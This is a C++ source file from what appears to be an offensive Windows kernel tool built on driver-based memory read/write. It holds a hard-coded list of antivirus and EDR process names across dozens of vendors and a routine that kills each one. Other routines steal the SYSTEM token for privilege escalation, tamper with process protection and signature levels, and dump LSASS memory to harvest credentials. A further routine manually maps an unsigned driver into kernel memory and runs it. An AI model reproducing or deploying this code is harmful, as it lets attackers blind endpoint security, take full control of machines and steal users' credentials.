#include "DriverLoader.h"
#include "DriverWorker.hpp"
#include "Log.hpp"
#include "Utils.hpp"
#include "PEUtils.hpp"
#include "KernelUtils.hpp"
#include <psapi.h>
#include <filesystem>
#include <fstream>
#include <DbgHelp.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <unordered_set>
#include <algorithm>

#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Dbghelp.lib")

const
wchar_t*
AvOrEdrNames[] = {
	// Acronis
	L"acronis_agent.exe",
	L"BackupAndRecoveryAgent.exe",
	L"managementagenthost.exe",
	L"mms.exe",

	// AlienVault
	L"alienvault-agent.exe",
	L"osqueryd.exe",

	// Avast
	L"afwServ.exe",
	L"aswEngSrv.exe",
	L"aswidsagent.exe",
	L"aswToolsSvc.exe",
	L"AvastSvc.exe",
	L"AvastUI.exe",
	L"avastsvc.exe",
	L"avastui.exe",
	L"bccavsvc.exe",
	L"wsc_proxy.exe",

	// AVG
	L"AVGUI.exe",
	L"AVGSvc.exe",
	L"avgnt.exe",
	L"avgsvca.exe",
	L"avgToolsSvc.exe",

	// Binary Defense
	L"BinaryDefenseAgent.exe",

	// Bitdefender
	L"Arrakis3.exe",
	L"BDAvScanner.exe",
	L"BDFsTray.exe",
	L"BDFileServer.exe",
	L"BDLived2.exe",
	L"BDLogger.exe",
	L"BDScheduler.exe",
	L"BDStatistics.exe",
	L"bdagent.exe",
	L"bdemsrv.exe",
	L"bdntwrk.exe",
	L"bdredline.exe",
	L"bdregsvr2.exe",
	L"bdservicehost.exe",

	// Blumira
	L"BlumiraAgent.exe",

	// Bromium
	L"BromiumDaemon.exe",
	L"BrDifxapi.exe",

	// Carbon Black
	L"cb.exe",
	L"cbcomms.exe",
	L"cbdefense.exe",
	L"carbonsensor.exe",
	L"RepMgr.exe",

	// Cisco Talos
	L"cfrutil.exe",
	L"CiscoAMPCEFWDriver.exe",
	L"cisco_amp_connector.exe",
	L"immunet.exe",

	// CrowdStrike
	L"ARWSRVC.EXE",
	L"ARCUpdate.exe",
	L"CSFalconContainer.exe",
	L"CSFalconService.exe",
	L"CSFalconUI.exe",
	L"csfalcondataprotect.exe",
	L"csfalcondaterepair.exe",
	L"REPRSVC.EXE",

	// Cynet
	L"CynetEPS.exe",
	L"CynetMS.exe",
	L"CynetSvc.exe",

	// Cybereason
	L"ActiveConsole.exe",
	L"cybereason.exe",
	L"CybereasonActiveProbe.exe",
	L"CybereasonCR.exe",

	// Cyvera
	L"CyveraConsole.exe",
	L"CyveraService.exe",
	L"CyvrAgentSvc.exe",
	L"CyvrFsFlt.exe",
	L"cyvrfsflt.exe",

	// Cylance / BlackBerry
	L"CylanceSvc.exe",

	// Darktrace
	L"DarktraceTSA.exe",

	// Deep Instinct
	L"DeepInstinct.exe",
	L"DeepInstinctService.exe",
	L"DIAgentService.exe",

	// Elastic
	L"a2guard.exe",
	L"a2service.exe",

	// ESET
	L"eamonm.exe",
	L"eamsi.exe",
	L"ecls.exe",
	L"efwd.exe",
	L"egui.exe",
	L"eguiProxy.exe",
	L"ekrn.exe",
	L"ekrnEpfw.exe",
	L"ERAAgent.exe",
	L"EraAgentSvc.exe",

	// Fortinet
	L"firesvc.exe",
	L"firetray.exe",
	L"FortiTray.exe",
	L"fortiedr.exe",
	L"fw.exe",

	// G DATA
	L"GDDServer.exe",
	L"QHPISVR.EXE",
	L"QUHLPSVC.EXE",
	L"SAPISSVC.EXE",

	// Heimdal
	L"HeimdalsecurityAgent.exe",

	// Huntress
	L"HuntressAgent.exe",
	L"HuntressRMM.exe",

	// Kaspersky
	L"avp.exe",
	L"avpsus.exe",
	L"avpui.exe",
	L"kavfs.exe",
	L"kavfsscs.exe",
	L"kavfswh.exe",
	L"kavfswp.exe",
	L"kavtray.exe",
	L"klactprx.exe",
	L"klcsldcl.exe",
	L"klcsweb.exe",
	L"klnagent.exe",
	L"klnagchk.exe",
	L"klscctl.exe",
	L"klserver.exe",
	L"klwtblfs.exe",
	L"kpf4ss.exe",
	L"ksde.exe",
	L"ksdeui.exe",
	L"vapm.exe",

	// LogRhythm
	L"LogProcessorService.exe",

	// McAfee / Trellix
	L"AGMService.exe",
	L"AGSService.exe",
	L"masvc.exe",
	L"macmnsvc.exe",
	L"McAfeeAgent.exe",
	L"mcshield.exe",
	L"mfeann.exe",
	L"mfevtps.exe",
	L"mfetp.exe",
	L"mfeepehost.exe",
	L"mfefire.exe",
	L"mfemactl.exe",
	L"mfemacsvc.exe",
	L"mfemgr.exe",
	L"mfemms.exe",
	L"MgntSvc.exe",
	L"ModuleCoreService.exe",
	L"tepfsvc.exe",

	// Microsoft Defender
	L"MSASCui.exe",
	L"MSASCuiL.exe",
	L"MpDefenderCoreService.exe",
	L"MsMpEng.exe",
	L"MsMpSvc.exe",
	L"MsSense.exe",
	L"msascuil.exe",
	L"msseces.exe",
	L"NisSrv.exe",
	L"nissrv.exe",
	L"SecurityHealthService.exe",
	L"SecurityHealthSystray.exe",
	L"SenseCncProxy.exe",
	L"SenseIR.exe",
	L"SenseNdr.exe",
	L"SenseSampleUploader.exe",
	L"smartscreen.exe",
	L"windefend.exe",

	// Morphisec
	L"MorphisecService.exe",

	// Norton / Symantec
	L"ccApp.exe",
	L"ccSvcHst.exe",
	L"ccsvchst.exe",
	L"ns.exe",
	L"nsservice.exe",
	L"nortonsecurity.exe",
	L"rtvscan.exe",
	L"SepMasterService.exe",
	L"sepWscSvc64.exe",
	L"smc.exe",
	L"SmcGui.exe",
	L"snac.exe",
	L"SymCorpUI.exe",
	L"SymWSC.exe",

	// OSSEC / Wazuh
	L"ossec-agent.exe",
	L"wazuh-agent.exe",

	// Palo Alto Networks (Traps / Cortex)
	L"cortexService.exe",
	L"trapsagent.exe",
	L"trapsd.exe",
	L"Traps.exe",

	// Panda Security
	L"panda_url_filtering.exe",
	L"pavfnsvr.exe",
	L"pavsrv.exe",
	L"psanhost.exe",
	L"PSANHost.EXE",
	L"pselamsvc.EXE",
	L"PSUAMain.EXE",
	L"PSUAService.EXE",
	L"pangps.exe",

	// Qualys
	L"qualys-cloud-agent.exe",
	L"QualysAgent.exe",

	// Rapid7
	L"ir_agent.exe",
	L"rapid7_endpoint.exe",

	// Red Canary
	L"RedCanaryAgent.exe",

	// Sangfor
	L"CSAAgent.exe",
	L"CSAService.exe",
	L"SangforAgent.exe",
	L"SangforCSA.exe",
	L"SangforEDR.exe",
	L"SangforInterface.exe",
	L"SangforMonitor.exe",
	L"SangforProtect.exe",
	L"SangforService.exe",
	L"SangforTray.exe",
	L"SangforUD.exe",

	// SentinelOne
	L"Sentinel.exe",
	L"SentinelAgent.exe",
	L"SentinelAgentWorker.exe",
	L"SentinelCtl.exe",
	L"SentinelHelperService.exe",
	L"SentinelMemoryScanner.exe",
	L"SentinelPowerShellExtension.exe",
	L"SentinelRanger.exe",
	L"SentinelServiceHost.exe",
	L"SentinelStaticEngine.exe",
	L"SentinelStaticEngineScanner.exe",
	L"SentinelUI.exe",

	// SonicWall
	L"SonicWallClientProtectionService.exe",
	L"swc_service.exe",

	// Sophos
	L"hmpalert.exe",
	L"McsAgent.exe",
	L"McsClient.exe",
	L"SavApi.exe",
	L"SAVAdminService.exe",
	L"SAVService.exe",
	L"SEDService.exe",
	L"SophosADSyncService.exe",
	L"SophosClean.exe",
	L"SophosCleanM64.exe",
	L"SophosFIMService.exe",
	L"SophosFS.exe",
	L"SophosHealth.exe",
	L"SophosLiveQueryService.exe",
	L"SophosMTR.exe",
	L"SophosMTRExtension.exe",
	L"SophosNetFilter.exe",
	L"SophosNtpService.exe",
	L"SophosOsquery.exe",
	L"SophosOsqueryExtension.exe",
	L"Sophos.PolicyEvaluation.Service.exe",
	L"SophosSafestore64.exe",
	L"SophosUI.exe",
	L"SophosUpdateMgr.exe",
	L"sophosav.exe",
	L"sophossps.exe",
	L"SSPService.exe",

	// Tanium
	L"TaniumClient.exe",
	L"TaniumCX.exe",
	L"tanclient.exe",

	// ThreatLocker
	L"ThreatLockerConsent.exe",
	L"threatlockerservice.exe",
	L"threatlockertray.exe",

	// Trend Micro
	L"coreFrameworkHost.exe",
	L"coreServiceShell.exe",
	L"NTRTScan.exe",
	L"ntrtscan.exe",
	L"Ntrtscan.exe",
	L"OfcService.exe",
	L"ofcDdaSvr.exe",
	L"PccNTMon.exe",
	L"PccNt.exe",
	L"TISafe.exe",
	L"TISafeSvc.exe",
	L"TmCCSF.exe",
	L"tmicAgentSetting.exe",
	L"TMBMSRV.exe",
	L"Tmbmsrv.exe",
	L"tm_netsrv.exe",
	L"TmListen.exe",
	L"tmntsrv.exe",
	L"TmPfw.exe",
	L"tmproxy.exe",
	L"TmProxy.exe",
	L"TmPreFilter.exe",
	L"TmSSClient.exe",
	L"TmsaInstance64.exe",
	L"TmWscSvc.exe",
	L"VOneAgentConsole.exe",
	L"VOneAgentConsoleTray.exe",

	// Uptycs
	L"VectorAgent.exe",
	L"UptycsAgent.exe",

	// Varonis
	L"DatAdvantage.exe",
	L"VaronisAgent.exe",

	// WatchGuard
	L"wlcsservice.exe",

	// Webroot
	L"WRSA.exe",
	L"WRSkyClient.exe",
	L"WRSVC.exe",
	L"wrsa.exe",

	// Windows Sysinternals
	L"Sysmon.exe",
	L"Sysmon64.exe",

	// Zscaler
	L"zlclient.exe",

	// 360
	L"ZhuDongFangYu.exe"
};


typedef USHORT RTL_ATOM, * PRTL_ATOM;

typedef
NTSTATUS
(WINAPI* pFnNtAddAtom)(
	_In_reads_bytes_opt_(Length) PCWSTR AtomName,
	_In_ ULONG Length,
	_Out_opt_ PRTL_ATOM Atom
	);

auto 
DriverLoader::GetKernelBase() -> ULONG64
{
	auto enableDebugPrivilege = []() -> BOOLEAN {
		NTSTATUS status = Utils::RtlAdjustPrivilege(20/*SeDebugPrivilege*/);
		if (!NT_SUCCESS(status))
		{
			LOG("[-] Failed to adjust privilege. Error code: 0x" << std::hex << status << " line = " << __LINE__);
			return FALSE;
		}
		return TRUE;
		};

	if (!enableDebugPrivilege())
	{
		return 0;
	}

	LPVOID	drivers[1024]{};
	DWORD	cbNeeded{};
	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		return reinterpret_cast<ULONG64>(drivers[0]);
	}

	return 0;
}


#define TEST 

BOOLEAN
DriverLoader::PrivilegeEscalation(
	ULONG64 SourceProcess,
	ULONG64 TargetProcess,
	ULONG	OffsetOfProcessToken)
{
	// Replace other driver classes.
	//std::unique_ptr<DriverProvider<BiosToolCommonDriver>> driverLoader = std::make_unique<BiosToolCommonDriver>();
	BOOLEAN bReturn{ FALSE };
	do 
	{
		
#ifdef TEST
		system("whoami");
		LOG("----------------------------------Fxxking System---------------------------------");
#endif
		ULONG64 systemToken = 0;
		if (!DriverWorker::Read((PVOID)(SourceProcess + OffsetOfProcessToken), &systemToken, sizeof(systemToken)))
		{
			LOG("[-] KernelRead System Token address : " << std::hex << (SourceProcess + OffsetOfProcessToken) << std::dec);
			break;
		}
		//LOG("[+] System Token address : " << std::hex << (SourceProcess + OffsetOfProcessToken) << " value : " << systemToken << std::dec << std::endl);

		systemToken &= ~0xF; // Clear the low 4 bits, which are used for reference counting in the token structure

		if (!DriverWorker::Write(reinterpret_cast<PVOID>(TargetProcess + OffsetOfProcessToken),
										   &systemToken,
										   sizeof(ULONG64)))
		{
			LOG("[-] KernelWrite Current Process Token address : " << std::hex << (TargetProcess + OffsetOfProcessToken) << std::dec);
			break;
		}

#ifdef TEST
		LOG("---------------------------------------------------------------------------------");
		LOG("[+] Privilege Escalation Successful!");

		system("whoami");
		LOG("-------------------------------------End-----------------------------------------");

		//system("pause");
#endif
		bReturn = TRUE;
	} while (FALSE);
	
	return bReturn;
}

BOOLEAN 
DriverLoader::SetProcessProtection(
	ULONG64			Process, 
	ULONG			OffsetOfProtection,
	PS_PROTECTION*	Protection)
{
	BOOLEAN bReturn{ FALSE };
	do
	{
		// set protection
		if (!DriverWorker::Write(reinterpret_cast<PVOID>(Process + OffsetOfProtection),
										   Protection,
										   sizeof(DriverLoader::PS_PROTECTION)))
		{
			LOG("[-] KernelWrite Current Process Protection address : " << std::hex << (Process + OffsetOfProtection) << std::dec);
			LOG("    - Protection Level: "	<< std::hex << static_cast<int>(Protection->Level) << std::dec);
			LOG("    - Protection Type: "	<< std::hex << static_cast<int>(Protection->Type) << std::dec);
			LOG("    - Protection Signer: " << std::hex << static_cast<int>(Protection->Signer) << std::dec);
			break;
		}
		/*else
		{
			LOG("[+] Successfully set process protection at address : " << std::hex << (Process + OffsetOfProtection) << std::dec);
			LOG("    - Protection Level: " << std::hex << static_cast<int>(Protection->Level) << std::dec);
			LOG("    - Protection Type: " << std::hex << static_cast<int>(Protection->Type) << std::dec);
			LOG("    - Protection Signer: " << std::hex << static_cast<int>(Protection->Signer) << std::dec);
		}*/
		
		bReturn = TRUE;
	} while (FALSE);

	return TRUE;
}

BOOLEAN 
DriverLoader::SetProcessSignatureLevel(
	ULONG64 Process,
	ULONG OffsetOfSignatureLevel, 
	UCHAR* SignatureLevel)
{
	return DriverWorker::Write(reinterpret_cast<PVOID>(Process + OffsetOfSignatureLevel),
							   SignatureLevel,
							   sizeof(UCHAR));
}


BOOLEAN
DriverLoader::GetProcessSignatureLevel(
	ULONG64 Process,
	ULONG OffsetOfSignatureLevel,
	UCHAR* SignatureLevel)
{
	UCHAR nSignatureLevel{ 0 };
	if (DriverWorker::Read(reinterpret_cast<PVOID>(Process + OffsetOfSignatureLevel),
		&nSignatureLevel,
		sizeof(UCHAR)))
	{
		*SignatureLevel = nSignatureLevel;
		return TRUE;
	}
	 
	return FALSE;
}


DriverLoader::PS_PROTECTION 
DriverLoader::GetProcessProtection(
	ULONG64 Process, 
	ULONG	OffsetOfProtection)
{
	PS_PROTECTION Protection{};
	BOOLEAN bReturn{ FALSE };
	do
	{
		// set protection
		if (!DriverWorker::Read(reinterpret_cast<PVOID>(Process + OffsetOfProtection),
								&Protection,
								sizeof(DriverLoader::PS_PROTECTION)))
		{
			LOG("[-] KernelRead Current Process Protection address : " << std::hex << (Process + OffsetOfProtection) << std::dec);
			LOG("    - Protection Level: " << std::hex << (Protection.Level) << std::dec);
			LOG("    - Protection Type: " << std::hex << (Protection.Type) << std::dec);
			break;
		}
		else
		{
			/*LOG("Porcess object " << std::hex << Process);
			LOG("OffsetOfProtection " << std::hex << OffsetOfProtection);
			auto hex = (UCHAR*)(&Protection);
			LOG("Protection " << std::hex << (int)(*hex));*/
		}

	} while (FALSE);

	return Protection;
}

BOOL 
DriverLoader::DumpLsass(
	HANDLE	ProcessHandle, 
	DWORD	Pid, 
	HANDLE  FileHandle)
{
	BOOLEAN result{ FALSE };

	MINIDUMP_TYPE dumpType = static_cast<MINIDUMP_TYPE>(
		MiniDumpWithFullMemory |
		MiniDumpWithHandleData |
		MiniDumpWithUnloadedModules |
		MiniDumpWithFullMemoryInfo |
		MiniDumpWithThreadInfo |
		MiniDumpWithTokenInformation
		);

	result = MiniDumpWriteDump(ProcessHandle, Pid, FileHandle, dumpType, nullptr, nullptr, nullptr);
	if (!result)
	{
		//LOG("MiniDumpWriteDump failed!!!");
		DWORD error = GetLastError();
		switch (error)
		{
		case ERROR_TIMEOUT:
			LOGW(L"Critical: MiniDumpWriteDump timed out - process may be unresponsive or in critical section");
			break;
		case RPC_S_CALL_FAILED:
			LOGW(L"Critical: RPC call failed - process may be a kernel-mode or system-critical process");
			break;
		case ERROR_ACCESS_DENIED:
			LOGW(L"Critical: Access denied - insufficient privileges even with protection bypass");
			break;
		case ERROR_PARTIAL_COPY:
			LOGW(L"Critical: Partial copy - some memory regions could not be read");
			break;
		default:
			LOGW(L"Critical: MiniDumpWriteDump failed " << std::hex << error);
			break;
		}
	}

	return result;
}



BOOLEAN 
DriverLoader::SetSignatureLevel(
	ULONG64 Process,
	ULONG	OffsetOfSignatureLevel, 
	PUCHAR	SignatureLevel)
{
	BOOLEAN bReturn{ FALSE };
	do
	{
		//UCHAR signatureLevel = 0xC; // SE_SIGNING_LEVEL_WINDOWS

		if (!DriverWorker::Write(reinterpret_cast<PVOID>(Process + OffsetOfSignatureLevel),
										   SignatureLevel,
										   sizeof(UCHAR)))
		{
			LOG("[-] KernelWrite Current Process Signature Level address : " << std::hex << (Process + OffsetOfSignatureLevel) << std::dec);
			break;
		}
		
		bReturn = TRUE;
	} while (FALSE);

	return TRUE;
}

VOID 
DriverLoader::KillAllAvOrEdr()
{
	std::unordered_set<std::wstring> edrSet{};
	for (size_t i = 0; i < _countof(AvOrEdrNames); ++i)
	{
		if (AvOrEdrNames[i] && *AvOrEdrNames[i] != L'\0')
		{
			edrSet.emplace(AvOrEdrNames[i]);
		}
	}

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		LOG("CreateToolhelp32Snapshot failed: " << GetLastError());
		return;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	DWORD lsassPid = 0;

	if (Process32First(hSnapshot, &pe32))
	{
		do
		{
			if (edrSet.count(pe32.szExeFile) > 0)
			{
				DriverWorker::Kill(pe32.th32ProcessID);
			}

		} while (Process32Next(hSnapshot, &pe32));
	}

	Utils::NtClose(hSnapshot);
}

auto DriverLoader::InitMemoryManager() ->BOOLEAN
{
	auto hNtdll = GetModuleHandleW(L"ntdll.dll");
	if (!hNtdll)
	{
		LOG("[-] Failed to get handle for ntdll.dll. Error code: " << std::hex << GetLastError() << std::dec);
		return FALSE;
	}

	pFnNtAddAtom pNtAddAtom = (pFnNtAddAtom)GetProcAddress(hNtdll, "NtAddAtom");
	if (!pNtAddAtom)
	{
		LOG("[-] Failed to get address for NtAddAtom. Error code: " << std::hex << GetLastError() << std::dec);
		return FALSE;
	}

	// call once
	pNtAddAtom(nullptr, 0, nullptr);

	return TRUE;
}

BOOLEAN 
DriverLoader::MapperDriver(
	const PUCHAR DriverData, 
	AllocationMode Mode /*= AllocationMode::AllocatePool*/)
{
	BOOLEAN bReturn{ FALSE };

	auto originalDriverPE = std::make_unique<PEUtils>(const_cast<PUCHAR>(DriverData));
	auto imageSize = originalDriverPE->GetDriverImageSize();
	if (!imageSize)
	{
		LOG("[-] Failed to get driver image size." << std::endl);
		return FALSE;
	}

	auto imageBase = originalDriverPE->GetDriverImageBase();
	if (!imageBase)
	{
		LOG("[-] Failed to get driver image base." << std::endl);
		return FALSE;
	}


	auto oep = originalDriverPE->GetEntryPoint();
	if (!oep)
	{
		LOG("[-] Failed to get driver entry point." << std::endl);
		return FALSE;
	}
	//else
	//{
	//	LOG("[+] Driver entry point offset: " << std::hex << oep << std::dec << std::endl);
	//}

	PVOID pDriverLocalBase = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, imageSize);
	if (!pDriverLocalBase)
	{
		LOG("[-] Failed to allocate memory for driver in local space." << std::endl);
		return FALSE;
	}
	//else
	//{
	//	LOG("[+] Allocated memory for driver in local space at address: " << std::hex << pDriverLocalBase << std::dec << std::endl);
	//}

	// copy headers and sections to local buffer
	memcpy(pDriverLocalBase, DriverData, originalDriverPE->GetSizeOfHeaders());

	for (const auto& sectionHeader : originalDriverPE->GetSectionHeaders())
	{
		if ((sectionHeader.Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
		{
			continue;
		}

		auto dest = reinterpret_cast<PUCHAR>(pDriverLocalBase) + sectionHeader.VirtualAddress;
		memcpy(dest, DriverData + sectionHeader.PointerToRawData, sectionHeader.SizeOfRawData);
	}



	auto selfDriverPE = std::make_unique<PEUtils>(reinterpret_cast<PUCHAR>(pDriverLocalBase));
	// alloc memory for driver in kernel space
	PVOID pDriverKernelBase{ nullptr };
	do
	{
		if (Mode == AllocationMode::AllocatePool)
		{
			pDriverKernelBase = AllocatePool2(imageSize);
			if (!pDriverKernelBase)
			{
				LOG("[-] Failed to allocate memory for driver in kernel space." << std::endl);
				break;
			}
		}

		selfDriverPE->FixedRelocations(reinterpret_cast<ULONG64>(pDriverKernelBase) - imageBase);

		if (!selfDriverPE->FixedSecurityCookie(reinterpret_cast<ULONG64>(pDriverKernelBase)))
		{
			LOG("Failed to fix driver Security cookie.");
			break;
		}

		if (!selfDriverPE->FixedImports())
		{
			LOG("[-] Failed to fix driver imports." << std::endl);
			break;
		}
		/*else
		{
			LOG("[+] Successfully fixed driver imports." << std::endl);
		}*/

		if (!DriverWorker::Write(pDriverKernelBase,
								 pDriverLocalBase,
								 imageSize))
		{
			LOG("[-] Failed to write driver to kernel memory." << std::endl);
			break;
		}
		else
		{
			//dump write driver data for testing
			/*PUCHAR pWriteBuffer = reinterpret_cast<PUCHAR>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, imageSize));
			if (pWriteBuffer)
			{
				if (DriverWorker::->Read(pDriverKernelBase,
												 pWriteBuffer,
												 imageSize))
				{
					auto path = std::filesystem::current_path();
					path += "\\DumpedDriver.sys";

					std::ofstream ofs(path.c_str(), std::ios::binary | std::ios::out);
					if (ofs.is_open())
					{
						ofs.write(reinterpret_cast<const char*>(pWriteBuffer), imageSize);
						ofs.close();
						LOG("dump memory address: " << std::hex << pDriverKernelBase << std::dec << " to file: " << path << std::endl);
						LOG("[+] Successfully dumped driver to: " << path << std::endl);
					}
				}
				HeapFree(GetProcessHeap(), 0, pWriteBuffer);
			}*/
		}

		// call OEP run mapping driver code
		const auto oepAddress = reinterpret_cast<ULONG64>(pDriverKernelBase) + oep;
		NTSTATUS status{ STATUS_SUCCESS };
		if (!CallKernelFunction(&status,
			oepAddress,
			0,
			0))
		{
			LOG("[-] Failed to call driver entry point." << std::endl);
			break;
		}

		bReturn = TRUE;
	} while (FALSE);

	if (pDriverLocalBase)
	{
		HeapFree(GetProcessHeap(), 0, pDriverLocalBase);
	}

	return bReturn;
}

BOOLEAN 
DriverLoader::MapperDriver(
	const std::string_view DriverPath, 
	AllocationMode Mode /*= AllocationMode::AllocatePool*/)
{
	std::ifstream readFile(DriverPath, std::ios::binary | std::ios::in);
	if (!readFile.is_open())
	{
		LOG("Read mapping driver file failed!!!");
		return FALSE;
	}

	std::stringstream readBuffer{};
	readBuffer << readBuffer.rdbuf();

	auto buffer = readBuffer.str();

	return MapperDriver(reinterpret_cast<PUCHAR>(buffer.data()), Mode);
}
